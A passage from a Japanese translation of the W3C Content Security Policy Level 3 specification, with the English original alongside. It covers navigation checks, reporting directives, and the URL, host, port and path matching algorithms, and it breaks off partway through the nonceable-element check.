］~AND［
%施策 【の`指令~集合$】内に［
`名前$ ~EQ `form-action$dir
］なる`指令$はある
］
⇒
~RET `許容ed^i
◎
If navigation type is "form-submission" and policy contains a directive named "form-action", return "Allowed".
</li>
	<li>
<p>
~IF［
この指令の`値$は［
`~source式$ ~EQ`~ACI$ `unsafe-allow-redirects$pl
］を包含しない
］
⇒
~RET `許容ed^i
◎
If this directive’s value does not contain a source expression that is an ASCII case-insensitive match for the "'unsafe-allow-redirects'" keyword-source, return "Allowed".
</p>

<p class="note">注記：
`unsafe-allow-redirects^pl ~flagが無い場合、~naviは すでに
<a href="#navigate-to-pre-navigate">`navigate-to^dir ~navi前~検査</a>
にて検査-済みである。
◎
Note: If the 'unsafe-allow-redirects' flag is not present we have already checked the navigation in §6.3.3.1 navigate-to Pre-Navigation Check.
</p>
	</li>
	<li>
~IF［
%~navi応答 の`~status$rsは`~redirect~status$である
］
⇒
~RET `許容ed^i
◎
If navigation response’s status is a redirect status, return "Allowed".
</li>
	<li>
~IF［
`要請は~source~listに合致するか？$A( %要請, この指令の`値$ )
~EQ `非合致^i
］
⇒
~RET `阻止ed^i
◎
If the result of executing §6.6.1.3 Does request match source list? on request and this directive’s value is "Does Not Match", return "Blocked".
</li>
	<li>
~RET `許容ed^i
◎
Return "Allowed".
</li>
</ol>

				</section>
			</section>
		</section>
		<section id="directives-reporting">
<h3 title="Reporting Directives">6.4. 指令の報告-法</h3>

<p>
この文書~内の各種~algoは、報告-処理の中に~hookされる
—
［
`新たな違反~obj$A( %大域~obj, … ) ／
`新たな違反~obj$A1( %要請, … )
］手続きを介して`違反$~objを構築した上で、報告を送達するときに，その~objを
`違反を報告する$A手続きに渡すことにより。
◎
Various algorithms in this document hook into the reporting process by constructing a violation object via §2.4.2 Create a violation object for request, policy, and directive or §2.4.1 Create a violation object for global, policy, and directive, and passing that object to §5.3 Report a violation to deliver the report.
</p>

			<section id="directive-report-uri">
<h4 title="report-uri">6.4.1. `report-uri^dir</h4>

<div class="note">
<p>注記：
`report-uri$dir 指令は、非推奨にされた。
代わりに `report-to$dir を利用されたし。
後者が在する場合、この指令は無視されることになる。
後方互換性を確保するためには、次のように両者とも指定することを勧める：
◎
Note: The report-uri directive is deprecated. Please use the report-to directive instead. If the latter directive is present, this directive will be ignored. To ensure backwards compatibility, we suggest specifying both, like this:
</p>

<pre class="http-code">
`Content-Security-Policy$h:
    ...;
    `report-uri$dir https://endpoint.com;
    `report-to$dir groupname
</pre>
</div>





<p>
`report-uri@dir
指令は、`報告先$
— 特定0の挙動が防止されたとき，`違反~報告$の送信-先になる~netowrk端点 —
の集合を定義する。
◎
The report-uri directive defines a set of endpoints to which violation reports will be sent when particular behaviors are prevented.
</p>

<pre class="ABNF">
`directive-name$p  = "report-uri"
`directive-value$p = `uri-reference$p *( `RWS$P `uri-reference$p )
; The uri-reference grammar is defined in Section 4.1 of RFC 3986.
</pre>

<p>
この指令は、それ自身は効果を持たず，他の指令との組合せにおいてのみ効果を~~発揮する。
◎
The directive has no effect in and of itself, but only gains meaning in combination with other directives.
</p>

			</section>
			<section id="directive-report-to">
<h4 title="report-to">6.4.2. `report-to^dir</h4>

<p>
`report-to@dir
指令は、違反~報告の送信-先とされるべき`報告先~group$ `REPORTING$r
を定義する。
この指令の挙動は、`違反を報告する$A~algoにて定義される。
この指令の名前と値の構文は、次の`~ABNF$で述べられる：
◎
The report-to directive defines a reporting group to which violation reports ought to be sent [REPORTING]. The directive’s behavior is defined in §5.3 Report a violation. The directive’s name and value are described by the following ABNF:
</p>

<pre class="ABNF">
`directive-name$p  = "report-to"
`directive-value$p = `token$p
</pre>

			</section>
		</section>
		<section id="directives-elsewhere">
<h3 title="Directives Defined in Other Documents">6.5. 他の文書にて定義される指令</h3>

<p>
この文書は、中核を成す指令の集合を定義し、他の仕様が~modularに拡張するための枠組みを整える。
この文書が~~発行された時点では、次の安定的な文書が~CSPを拡張している：
◎
This document defines a core set of directives, and sets up a framework for modular extension by other specifications. At the time this document was produced, the following stable documents extend CSP:
</p>

<ul>
	<li>
`MIX$r は、
`block-all-mixed-content$dir 指令を定義する。
◎
[MIX] defines block-all-mixed-content
</li>
	<li>
`UPGRADE-INSECURE-REQUESTS$r は、
`upgrade-insecure-requests$dir 指令を定義する。
◎
[UPGRADE-INSECURE-REQUESTS] defines upgrade-insecure-requests
</li>
	<li>
`SRI$r は、
`require-sri-for$dir 指令を定義する。
◎
[SRI] defines require-sri-for
</li>
</ul>

<p>
~CSPに対する拡張は、 `RFC7762$r に従って登録され~MUST。
特に、その文書の 4.2 節に論じられている判定基準に注意。
◎
Extensions to CSP MUST register themselves via the process outlined in [RFC7762]. In particular, note the criteria discussed in Section 4.2 of that document.
</p>

<p>
新たな指令は、各種~hook
—
`要請前~検査$A,
`要請後~検査$A,
`応答~検査$A,
`初期化$A —
を利用して，自身を~Fetch／~HTMLに統合する~SHOULDである。
◎
New directives SHOULD use the pre-request check, post-request check, response check, and initialization hooks in order to integrate themselves into Fetch and HTML.
</p>


		</section>
		<section id="algorithms">
<h3 title="Matching Algorithms">6.6. 各種~照合~algo</h3>

			<section id="matching-urls">
<h4 title="URL Matching">6.6.1. URL 照合</h4>

				<section id="does-request-violate-policy">
<h5 title="Does request violate policy?">6.6.1.1. %要請 は%施策 に違反するか？</h5>

<p>
次の~algoは、所与の
( `要請$ %要請, `施策$ %施策 )
に対し，［
%要請 が %施策 に違反するならば 違反された`指令$ ／
違反しないならば `非違反^i
］を返す：
◎
Given a request (request) and a policy (policy), this algorithm returns the violated directive if the request violates the policy, and "Does Not Violate" otherwise.
</p>

<ol>
	<li>
%違反ed指令 ~LET `非違反^i
◎
Let violates be "Does Not Violate".
</li>
	<li>
<p>
%施策 内の
~EACH( %指令 )
に対し：
◎
For each directive in policy:
</p>
		<ol>
			<li>
%結果 ~LET
( %要請, %施策 )
に対し，
%指令 の`要請前~検査$Aを実行した結果
◎
Let result be the result of executing directive’s pre-request check on request and policy.
</li>
			<li>
~IF［
%結果 ~EQ `阻止ed^i
］
⇒
%違反ed指令 ~LET %指令
◎
If result is "Blocked", then let violates be directive.
</li>
		</ol>
	</li>
	<li>
~RET %違反ed指令
◎
Return violates.
</li>
</ol>

				</section>
				<section id="match-nonce-to-source-list">
<h5 title="Does nonce match source list?">6.6.1.2. %~nonce は %~source~list に合致するか？</h5>

<p>
次の~algoは、所与の
( `要請$の`暗号用~nonce~metadata$rq %~nonce, `~source~list$ %~source~list )
に対し，［
%~nonce が %~source~list 内のいずれかの式に合致するならば `合致es^i ／
合致しないならば `非合致^i
］を返す：
◎
Given a request’s cryptographic nonce metadata (nonce) and a source list (source list), this algorithm returns "Matches" if the nonce matches one or more source expressions in the list, and "Does Not Match" otherwise:
</p>

<ol>
	<li>
~Assert：
%~source~list ~NEQ ~NULL
◎
Assert: source list is not null.
</li>
	<li>
~IF［
%~nonce ~EQ 空~文字列
］
⇒
~RET `非合致^i
◎
If nonce is the empty string, return "Does Not Match".
</li>
	<li>
<p>
%~source~list 内の
~EACH( %式 )
に対し：
◎
For each expression in source list:
</p>
		<ol>
			<li>
~IF［
%式 は `nonce-source$p 文法に合致する
］~AND［
%~nonce ~EQ %式 の `base64-value$p 成分
］
⇒
~RET `合致es^i
◎
If expression matches the nonce-source grammar, and nonce is a case-sensitive match for expression’s base64-value part, return "Matches".
</li>
		</ol>
	</li>
	<li>
~RET `非合致^i
◎
Return "Does Not Match".
</li>
</ol>

				</section>
				<section id="match-request-to-source-list">
<h5 title="Does request match source list?">6.6.1.3. %要請 は %~source~list に合致するか？</h5>

<p>
この~algoは、所与の
( `要請$ %要請, `~source~list$ %~source~list )
に対し，次を返す
⇒
`~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？$A( %要請 の`現在の~url$rq, %~source~list, %要請 の`生成元$rq, %要請 の`~redirect回数$rq )
◎
Given a request (request), and a source list (source list), this algorithm returns the result of executing §6.6.1.5 Does url match source list in origin with redirect count? on request’s current url, source list, request’s origin, and request’s redirect count.
</p>

<p class="note">注記：
これは，一般に、所与の`要請$を検証0するために
`指令$の`要請前~検査$A~algoから利用される。
◎
Note: This is generally used in directives' pre-request check algorithms to verify that a given request is reasonable.
</p>

				</section>
				<section id="match-response-to-source-list">
<h5 title="Does response to request match source list?">6.6.1.4. %要請 に対する %応答 は %~source~list に合致するか？</h5>

<p>
この~algoは、所与の
( `応答$ %応答, `要請$ %要請, `~source~list$ %~source~list )
<!-- ＊原文抜け 要請 -->
に対し，次を返す
⇒
`~urlは ( 生成元, ~redirect回数 ) について~source~listに合致するか？$A( %応答 の`~url$rs, %~source~list, %要請 の`生成元$rq, %要請 の`~redirect回数$rq )
◎
Given a request (request), and a source list (source list), this algorithm returns the result of executing §6.6.1.5 Does url match source list in origin with redirect count? on response’s url, source list, request’s origin, and request’s redirect count.
</p>

<p class="note">注記：
これは，一般に、所与の`応答$を検証0するために
`指令$の`要請後~検査$A~algoから利用される。
◎
Note: This is generally used in directives' post-request check algorithms to verify that a given response is reasonable.
</p>

				</section>
				<section id="match-url-to-source-list">
<h5 title="Does url match source list in origin with redirect count?">6.6.1.5. %~url は ( %生成元, %~redirect回数 ) について %~source~list に合致するか？</h5>


<p>
次の~algoは、所与の
( `~URL$ %~url, `~source~list$ %~source~list, `生成元$ %生成元, 整数 %~redirect回数 )
に対し，
%~url は %~source~list 内のいずれかの`~source式$に［
合致するならば `合致es^i ／
合致しないならば `非合致^i
］を返す：
◎
Given a URL (url), a source list (source list), an origin (origin), and a number (redirect count), this algorithm returns "Matches" if the URL matches one or more source expressions in source list, or "Does Not Match" otherwise:
</p>

<ol>
	<li>
~Assert：
%~source~list ~NEQ ~NULL
◎
Assert: source list is not null.
</li>
	<li>
~IF［
%~source~list は空である
］
⇒
~RET `非合致^i
◎
If source list is an empty list, return "Does Not Match".
</li>
	<li>
<p >
~IF［
%~source~list は単独の文字列 %s のみからなる
］~AND［
%s ~EQ`~ACI$ "`none$pl"
］
⇒
~RET `非合致^i
◎
If source list contains a single item which is an ASCII case-insensitive match for the string "'none'", return "Does Not Match".
</p>

<p class="note">注記：
空の %~source~list （すなわち、（
<samp>`script-src^dir host1</samp>
とは対照的に）値を伴わない指令
<samp>`script-src$dir</samp>
）は、 `none$pl を包含している %~source~list に等価になり，どの~URLにも合致しない。
◎
Note: An empty source list (that is, a directive without a value: script-src, as opposed to script-src host1) is equivalent to a source list containing 'none', and will not match any URL.
</p>
	</li>
	<li>
<p>
%~source~list 内の
~EACH( %式 )
に対し：
◎
For each expression in source list:
</p>
		<ol>
			<li>
~IF［
`~urlは ( 生成元, ~redirect回数 ) について式に合致するか？$A( %~url, %式, %生成元, %~redirect回数 )
~EQ `合致es^i
］
⇒
~RET `合致es^i
◎
If §6.6.1.6 Does url match expression in origin with redirect count? returns "Matches" when executed upon url, expression, origin, and redirect count, return "Matches".
</li>
		</ol>
	</li>
	<li>
~RET `非合致^i
◎
Return "Does Not Match".
</li>
</ol>

				</section>
				<section id="match-url-to-source-expression">
<h5 title="Does url match expression in origin with redirect count?">6.6.1.6. %~url は ( %生成元, %~redirect回数 ) について %式 に合致するか？</h5>

<p>
次の~algoは、
( `~URL$ %~url, `~source式$ %式, `生成元$ %生成元, 整数 %~redirect回数 )
が与えられた下で，
%~url が %式 に［
合致するならば `合致es^i ／
合致しないならば `非合致^i
］を返す：
◎
Given a URL (url), a source expression (expression), an origin (origin), and a number (redirect count), this algorithm returns "Matches" if url matches expression, and "Does Not Match" otherwise.
</p>

<p class="note">注記：
%生成元 は［
%式 が相対的に解決されるべき資源
］の`生成元$である
— 例えば "`self$pl" は、文脈の その一片に依存して別個の意味になる。
◎
Note: origin is the origin of the resource relative to which the expression should be resolved. "'self'", for instance, will have distinct meaning depending on that bit of context.
</p>


<ol>
	<li>
<p>
~IF［
%式 ~EQ `~asterisk$
］~AND［
%~url の`~scheme$url ~IN { `~network~scheme$, %生成元 の`~scheme$o }
］
⇒
~RET `合致es^i
◎
If expression is the string "*", return "Matches" if one or more of the following conditions is met:
• url’s scheme is a network scheme.
• url’s scheme is the same as origin’s scheme.
</p>

<p class="note">注記：
この~logicは、非`~network~scheme$からの資源を許容するためには，［
明示的にそう指定するか（例：
`default-src * data: custom-scheme-1: custom-scheme-2:^s
），または 被保護~資源は同じ~schemeから読込まれ~MUST
］ことを意味する。
◎
Note: This logic means that in order to allow a resource from a non-network scheme, it has to be either explicitly specified (e.g. default-src * data: custom-scheme-1: custom-scheme-2:), or the protected resource must be loaded from the same scheme.
</p>
	</li>
	<li>
~IF［
%式 は `scheme-source$p 文法に合致する
］
⇒
~RET
`~scheme成分は合致するか？$A(
%式 の `scheme-part$p, %~url の`~scheme$url
)
◎
If expression matches the scheme-source or host-source grammar:
◎
• If expression has a scheme-part, and it does not scheme-part match url’s scheme, return "Does Not Match".
◎
• If expression matches the scheme-source grammar, return "Matches".
◎
↓</li>
	<li>
<p>
~IF［
%式 は `host-source$p 文法に合致する
］：
◎
If expression matches the host-source grammar:
</p>
		<ol>
			<li>
~IF［
%~url の`~host$url ~EQ ~NULL
］
⇒
~RET `非合致^i
◎
If url’s host is null, return "Does Not Match".
</li>
			<li>
~IF［
%式 は `scheme-part$p を含む
］~AND［
`~scheme成分は合致するか？$A(
%式 の `scheme-part$p, %~url の`~scheme$url
)
~EQ `非合致^i
］
⇒
~RET `非合致^i
◎
↑</li>
			<li>
<p>
~IF［
%式 は `scheme-part$p を含まない
］~AND［
`~scheme成分は合致するか？$A(
%生成元 の`~scheme$o, %~url の`~scheme$url
)
~EQ `非合致^i
］
⇒
~RET `非合致^i
◎
If expression does not have a scheme-part, and origin’s scheme does not scheme-part match url’s scheme, return "Does Not Match".
</p>

<p class="note">注記：
上の `scheme-part$p に対するときと同様に、~schemeを伴わない `host-source$p 式は，非保安的~schemeから保安的~schemeへの昇格を許容する。
◎
Note: As with scheme-part above, we allow schemeless host-source expressions to be upgraded from insecure schemes to secure schemes.
</p>
			</li>
			<li>
~IF［
`~host成分は合致するか？$A(
%式 の `host-part$p, %~url の`~host$url
)
~EQ `非合致^i
］
⇒
~RET `非合致^i
◎
If expression’s host-part does not host-part match url’s host, return "Does Not Match".
</li>
			<li>
%~port成分 ~LET ［
%式 は `port-part$p を含むならば それ ／
~ELSE_ ~NULL
］
◎
Let port-part be expression’s port-part if present, and null otherwise.
</li>
			<li>
~IF［
`~port成分は合致するか？$A(%~port成分, %~url の`~port$url,
%~url の`~scheme$url
)
~EQ `非合致^i
］
⇒
~RET `非合致^i
◎
If port-part does not port-part match url’s port and url’s scheme, return "Does Not Match".
</li>
			<li>
<p>
~IF［
%式 は 空でない `path-part$p を含む
］~AND［
%~redirect回数 ~EQ 0
］：
◎
If expression contains a non-empty path-part, and redirect count is 0, then:
</p>
				<ol>
					<li>
%~url~path ~LET
~url の`~path$urlの各~成分を`~slash$で区切って連結した結果
◎
Let path be the resulting of joining url’s path on the U+002F SOLIDUS character (/).
</li>
					<li>
~IF［
`~path成分は合致するか？$A( %式 の `path-part$p, %~url~path )
~EQ `非合致^i
］
⇒
~RET `非合致^i
◎
If expression’s path-part does not path-part match path, return "Does Not Match".
</li>
				</ol>
			</li>
			<li>
~RET `合致es^i
◎
Return "Matches".
</li>
		</ol>
	</li>

	<li>
<p>
~IF［
%式 ~EQ`~ACI$ "`self$pl"
］：
◎
If expression is an ASCII case-insensitive match for "'self'", return "Matches" if one or more of the following conditions is met:
</p>
		<ol>
			<li>
~IF［
%生成元 と［
%~url の`生成元$url
］は同じである
］
⇒
~RET `合致es^i
◎
origin is the same as url’s origin
</li>
			<li>
<p>
~IF［
次のすべてが満たされる
］
⇒
~RET `合致es^i：
</p>
				<ul>
					<li>
%生成元 の`~host$url ~EQ %~url の`~host$url
</li>
					<li>
%生成元 の`~port$url ~EQ %~url の`~port$url
— この比較においては
⇒
両~urlのそれぞれに対し、その`~port$urlに対する~NULL値は，その`~scheme$url用の`既定~port$と見なす。
</li>
					<li>
［
%生成元 の`~scheme$url ~EQ `http^l
］~OR［
%~url の`~scheme$url ~IN { `https^l, `wss^l }
］
</li>
				</ul>
◎
origin’s host is the same as url’s host, origin’s port and url’s port are either the same or the default ports for their respective schemes, and one or more of the following conditions is met:
• url’s scheme is "https" or "wss"
• origin’s scheme is "http"
</li>
		</ol>

<p class="note">注記：
上の `scheme-part$p の~logicと同様に、
"`self$pl" 照合~algoは、そうするのが安全なときには，保安的~schemeへの昇格を許容する。
これらの昇格は、［
特定0の~scheme用の既定~port ／
被保護~資源の生成元に合致する~port
］上で稼働中の報告先に，制限される
— 昇格の成功-が理にかなうと期待されるものについて取り扱うには、これで十分と見られるので。
◎
Note: Like the scheme-part logic above, the "'self'" matching algorithm allows upgrades to secure schemes when it is safe to do so. We limit these upgrades to endpoints running on the default port for a particular scheme or a port that matches the origin of the protected resource, as this seems sufficient to deal with upgrades that can be reasonably expected to succeed.
</p>
	</li>
	<li>
~RET `非合致^i
◎
Return "Does Not Match".
</li>
</ol>



				</section>
				<section id="match-schemes">
<h5 title="scheme-part matching">6.6.1.7. `scheme-part^p の照合</h5>

<p>
`~scheme成分は合致するか？@A
( %A, %B )
（いずれも`~ASCII文字列$）は、
~CSP~source式の `scheme-part$p %A が
~URLの`~scheme$url %B に合致するかどうかを検査する：
◎
An ASCII string scheme-part matches another ASCII string if a CSP source expression that contained the first as a scheme-part could potentially match a URL containing the latter as a scheme. For example, we say that "http" scheme-part matches "https".
</p>

<div class="note">
<p>注記：
この関係は非対称であり、
%A, %B を入れ替えた結果は同じになるとは限らない。
例えば、~source式［
`https:^s,
`https://example.com/^s
］はいずれも，~URL
`http://example.com/^s
に合致しない。
</p>

<p>
また，明示的に非保安的な式からの保安的への昇格は、常に許容される。
例えば、次の表の 1 列目に挙げる式は，同じ行の 2 列目に挙げる式と等価に扱われる：
</p>

<table><tbody>
<tr><td>`script-src http:^s
<td>`script-src http: https:^s

<tr><td>`script-src http://example.com^s
<td>`script-src http://example.com https://example.com^s

<tr><td>`connect-src ws:^s
<td>`connect-src ws: wss:^s

</tbody></table>

◎
Note: The matching relation is asymmetric. For example, the source expressions https: and https://example.com/ do not match the URL http://example.com/. We always allow a secure upgrade from an explicitly insecure expression. script-src http: is treated as equivalent to script-src http: https:, script-src http://example.com to script-src http://example.com https://example.com, and connect-src ws: to connect-src ws: wss:.
</div>

<ol>
	<li>
<p>
~IF［
次のいずれかが満たされる
］
⇒
~RET `合致es^i：
◎
More formally, two ASCII strings (A and B) are said to scheme-part match if the following algorithm returns "Matches":
◎
If one of the following is true, return "Matches":
</p>

		<ul>
			<li>
%A ~EQ`~ACI$ %B
◎
A is an ASCII case-insensitive match for B.
</li>
			<li>
［
%A ~EQ`~ACI$ `http^l
］~AND［
%B ~EQ`~ACI$ `https^l
］
◎
A is an ASCII case-insensitive match for "http", and B is an ASCII case-insensitive match for "https".
</li>
			<li>
［
%A ~EQ`~ACI$ `ws^l
］~AND［
%B ~IN`~ACI$ { `wss^l, `http^l,  `https^l }
］
◎
A is an ASCII case-insensitive match for "ws", and B is an ASCII case-insensitive match for "wss", "http", or "https".
</li>
			<li>
［
%A ~EQ`~ACI$ `wss^l
］~AND［
%B ~EQ`~ACI$ `https^l
］
◎
A is an ASCII case-insensitive match for "wss", and B is an ASCII case-insensitive match for "https".
</li>
		</ul>
	</li>
	<li>
~RET `非合致^i
◎
Return "Does Not Match".
</li>
</ol>

				</section>
				<section id="match-hosts">
<h5 title="host-part matching">6.6.1.8. `host-part^p の照合</h5>

<p>
`~host成分は合致するか？@A
( %A, %B )
（いずれも`~ASCII文字列$）は、~CSP~source式の `host-part$p %A が
~URLの`~host$url %B に合致するかどうかを検査する：
◎
An ASCII string host-part matches another ASCII string if a CSP source expression that contained the first as a host-part could potentially match a URL containing the latter as a host. For example, we say that "www.example.com" host-part matches "www.example.com".
◎
More formally, two ASCII strings (A and B) are said to host-part match if the following algorithm returns "Matches":
</p>

<p class="note">注記：
この関係は非対称であり、
%A, %B を入れ替えた結果は同じになるとは限らない。
例えば、 ( %A, %B ) に対する
( `*.example.com^s, `www.example.com^s )
の結果は `合致es^i になるが，
( `www.example.com^s, `*.example.com^s )
の結果は `非合致^i になる。
◎
Note: The matching relation is asymmetric. That is, A matching B does not mean that B will match A. For example, *.example.com host-part matches www.example.com, but www.example.com does not host-part match *.example.com.
</p>

<ol>
	<li>
<p>
~IF［
%A の最初の文字 ~EQ `~asterisk$
］：
◎
If the first character of A is an U+002A ASTERISK character (*):
</p>

		<ol>
			<li>
%A ~SET %A から先頭の文字を除去した結果
◎
Let remaining be the result of removing the leading ("*") from A.
</li>
			<li>
~RET［
%A ~EQ`~ACI$［
%B の~~尾部（ %A と同じ文字~数の）
］ならば `合致es^i ／
~ELSE_  `非合致^i
］
◎
If remaining (including the leading U+002E FULL STOP character (.)) is an ASCII case-insensitive match for the rightmost characters of B, then return "Matches". Otherwise, return "Does Not Match".
</li>
		</ol>
	</li>
	<li>
~IF［
%A ~NEQ`~ACI$ %B
］
⇒
~RET `非合致^i
◎
If A is not an ASCII case-insensitive match for B, return "Does Not Match".
</li>
	<li>
<div>
<p>
~IF［
次のいずれかの条件が満たされる
］
⇒
~RET `非合致^i：
</p>
				<ul>
					<li>
［
%A は `IPv4address$p 規則 `RFC3986$r に合致する
］~AND［
%A ~NEQ `127.0.0.1^l
］
</li>
					<li>
%A は `~IPv6~address$である
</li>
				</ul>

◎
If A matches the IPv4address rule from [RFC3986], and is not "127.0.0.1"; or if A is an IPv6 address, return "Does Not Match".
</div>

<p class="note">注記：
この仕様の将来~versionは、用法や需要に依存して，~literalによる［
IPv6 ／ IPv4
］~addressを許容するかもしれない。
しかしながら、 IP ~addressの保安~上の特質は，名前を有する~hostに比して弱いので、作者には，可能なら後者を選好することが奨励される。
◎
Note: A future version of this specification may allow literal IPv6 and IPv4 addresses, depending on usage and demand. Given the weak security properties of IP addresses in relation to named hosts, however, authors are encouraged to prefer the latter whenever possible.
</p>
	</li>
	<li>
~RET `合致es^i
◎
Return "Matches".
</li>
</ol>



				</section>
				<section id="match-ports">
<h5 title="port-part matching">6.6.1.9. `port-part^p の照合</h5>


<p>
`~port成分は合致するか？@A
( %A, %B, %~scheme )
（いずれも`~ASCII文字列$）は、
~CSP~source式の `port-part$p %A が
~URLの［
`~port$url %B, `~scheme$url %~scheme
］に合致するかどうかを検査する：
◎
An ASCII string (port A) port-part matches two other ASCII strings (port B and scheme B) if a CSP source expression that contained the first as a port-part could potentially match a URL containing the latter as port and scheme. For example, "80" port-part matches matches "80"/"http".
</p>

<div >
<ol>
	<li>
%既定~port ~LET %~scheme 用の`既定~port$
</li>
	<li>
<p>
~RET［
次のいずれかが満たされるならば  `合致es^i ／
~ELSE_ `非合致^i
］：
</p>

<ul><li>［
%A ~EQ 空
］~AND［
%B ~EQ %既定~port
］
</li><li>%A ~EQ `~asterisk$
</li><li>［
%A ~NEQ 空
］~AND［
%A ~EQ %B †
］
</li><li>［
%B ~EQ 空
］~AND［
%A ~EQ %既定~port
］
</li></ul>
	</li>
</ol>

◎
• If port A is empty:
•• If port B is the default port for scheme B, return "Matches". Otherwise, return "Does Not Match".
• If port A is equal to "*", return "Matches".
• If port A is a case-sensitive match for port B, return "Matches".
• If port B is empty:
•• If port A is the default port for scheme B, return "Matches". Otherwise, return "Does not Match".
• Return "Does Not Match".
</div>


<p class="trans-note">【
%A, %B には ~NULL も渡され得るが、おそらく，ここでの 空（ `empty^en ）を意味する。
】【
`既定~port$が未定義の場合にどう解釈されるのか不明。
】【†
この比較は 数として解釈する下で行うのかどうか、はっきりしない（~URLの`~port$urlは、実際には整数として定義されている）。
例えば `080^l は~port番号 80 と異なるものと扱われるかもしれない。
】</p>



				</section>
				<section id="match-paths">
<h5 title="path-part matching">6.6.1.10. `path-part^p の照合</h5>

<p>
`~path成分は合致するか？@A
( %A, %B )
（いずれも`~ASCII文字列$）は、
~CSP~source式の `path-part$p %A が
~URLの`~path$url %B に合致するかどうかを検査する：
◎
An ASCII string (path A) path-part matches another ASCII string (path B) if a CSP source expression that contained the first as a path-part could potentially match a URL containing the latter as a path. For example, we say that "/subdirectory/" path-part matches "/subdirectory/file".
</p>

<p class="note">注記：
この関係は非対称であり、
%A, %B を入れ替えた結果は同じになるとは限らない。
◎
Note: The matching relation is asymmetric. That is, path A matching path B does not mean that path B will match path A.
</p>

<ol>
	<li>
~IF［
%A ~EQ 空~文字列
］
⇒
~RET `合致es^i
◎
If path A is empty, return "Matches".
</li>
	<li>
~IF［
%A ~EQ `~slash$
］~AND［
%B ~EQ 空~文字列
］
⇒
~RET `合致es^i
◎
If path A consists of one character that is equal to the U+002F SOLIDUS character (/) and path B is empty, return "Matches".
</li>
	<li>
( %listA,  %listB ) ~LET
( `区切子で厳密に分割する$( %A, `~slash$ ), `区切子で厳密に分割する$( %B, `~slash$ ) )
◎
Let exact match be false if the final character of path A is the U+002F SOLIDUS character (/), and true otherwise.
◎
Let path list A and path list B be the result of strictly splitting path A and path B respectively on the U+002F SOLIDUS character (/).
</li>
	<li>
( %LA, %LB ) ~LET ( %listA の`~size$, %listB の`~size$ )
◎
↓</li>
	<li>
~IF［
%LA ~GT %LB
］
⇒
~RET `非合致^i
◎
If path list A has more items than path list B, return "Does Not Match".
</li>
	<li>
~IF［
%listA[ %LA − 1 ] ~EQ 空~文字列
］
⇒
%LA ~DECBY 1
◎
↓</li>
	<li>
~ELIF［
%LA ~NEQ %LB
］
⇒
~RET `非合致^i
◎
If exact match is true, and path list A does not have the same number of items as path list B, return "Does Not Match".
◎
If exact match is false:
• Assert: the final item in path list A is the empty string.
• Remove the final item from path list A.
</li>
	<li>
~EACH( 整数 %i ~IN { 0 〜 %LA − 1 } )
に対し
⇒
~IF［
`~byte列を~byte列に~percent-復号する$( %listA[ %i ] )
~NEQ
`~byte列を~byte列に~percent-復号する$( %listB[ %i ] )
］
⇒
~RET `非合致^i
◎
For each piece A in path list A:
• Let piece B be the next item in path list B.
• Percent decode piece A.
• Percent decode piece B.
• If piece A is not a case-sensitive match for piece B, return "Does Not Match".
</li>
	<li>
~RET `合致es^i
◎
Return "Matches".
</li>
</ol>

				</section>
				<section id="effective-directive-for-a-request">
<h5 title="Get the effective directive for request">6.6.1.11. %要請 に対する有効な指令を取得する</h5>

<p>
各種 `~fetch指令$は、特定の行先の`要請$を制御する。
次の~algoは、所与の
( `要請$ %要請 )
に対し，［
~NULL, または
`有効な指令@
の`名前$
］を返す：
◎
Each fetch directive controls a specific destination of request. Given a request (request), the following algorithm returns either null or the name of the request’s effective directive:
</p>

<ol>
	<li>
<p>
%要請 の`行先$rqに応じて：
◎
Switch on request’s destination, and execute the associated steps:
</p>
		<dl class="switch">
			<dt>空~文字列</dt>
			<dd>
~IF［
%要請 の`起動元$rq ~EQ 空~文字列
］
⇒
~RET `connect-src$dir
◎
If the request’s initiator is the empty string, return connect-src.
</dd>

			<dt>`manifest^l</dt>
			<dd>
~RET `manifest-src$dir
</dd>

			<dt>`object^l</dt>
			<dt>`embed^l</dt>
			<dd>
~RET `object-src$dir
</dd>

			<dt>`prefetch^l</dt>
			<dt>`prerender^l</dt>
			<dd>
~RET `prefetch-src$dir
</dd>

			<dt>`document^l</dt>
			<dd>
~IF［
%要請 の`~target閲覧文脈$rqは`入子の閲覧文脈$である
］
⇒
~RET `frame-src$dir
◎
If the request’s target browsing context is a nested browsing context, return frame-src.
</dd>

			<dt>`audio^l</dt>
			<dt>`track^l</dt>
			<dt>`video^l</dt>
			<dd>
~RET `media-src$dir
◎
Return media-src.
</dd>

			<dt>`font^l</dt>
			<dd>
~RET `font-src$dir
◎
Return font-src.
</dd>

			<dt>`image^l</dt>
			<dd>
~RET `img-src$dir
◎
Return img-src.
</dd>


			<dt>`style^l</dt>
			<dd>
~RET `style-src$dir
◎
Return style-src.
</dd>

			<dt>`script^l</dt>
			<dt>`xslt^l</dt>
			<dd>
~RET `script-src$dir
◎
Return script-src.
</dd>

			<dt>`sharedworker^l</dt>
			<dt>`worker^l</dt>
			<dd>
~RET `worker-src$dir
◎
Return worker-src.
</dd>
		</dl>
	</li>
	<li>
~RET ~NULL
◎
Return null.
</li>
</ol>

				</section>
			</section>
			<section id="matching-elements">
<h4 title="Element Matching Algorithms">6.6.2. 要素に対する照合~algo</h4>


				<section id="is-element-nonceable">
<h5 title="Is element nonceable?">6.6.2.1. %要素 は~nonce可能か？</h5>

<p>
この~algoは、所与の`要素$ %要素 に対し，
`nonce-source$p 式を［
適用できるならば（
<a href="#security-nonce-stealing">~nonceの盗用 節</a>
を見よ） `~nonce可能^i ／
適用すべきでないならば `~nonce可能でない^i
］を返す：
◎
Given an Element (element), this algorithm returns "Nonceable" if a nonce-source expression can match the element (as discussed in §7.2 Nonce Stealing), and "Not Nonceable" if such expressions should not be applied.
</p>

<ol>
	<li>
~IF［
%要素 は 名前 `nonce^l の属性を有さない
］
⇒
~RET `~nonce可能でない^i
◎
If element does not have an attribute named "nonce", return "Not Nonceable".
</li>
	<li>
<p>
~IF［
%要素 は `script$e 要素である
］
⇒
%要素 内の
~EACH( %属性 )
に対し：
◎
If element is a script element, then for each attribute in element:
</p>
		<ol>
			<li>
~IF［
%属性 の名前 ~IN`~ACI$ { `&lt;script^l, `&lt;style^l }
］
⇒
~RET `~nonce可能でない^i
◎
If attribute’s name is an ASCII case-insensitive match for the string "&lt;script" or the string "&lt;style", return "Not Nonceable".
</li>
			<li>
~IF［
%属性 の値は `~ASCII大小無視$で［
`&lt;script^l, `&lt;style^l
］のいずれかに合致する文字列を包含している
］
⇒
~RET `~nonce可能でない^i
◎
If attribute’s value contains an ASCII case-insensitive match the string "&lt;script" or the string "&lt;style", return "Not Nonceable".
</li>
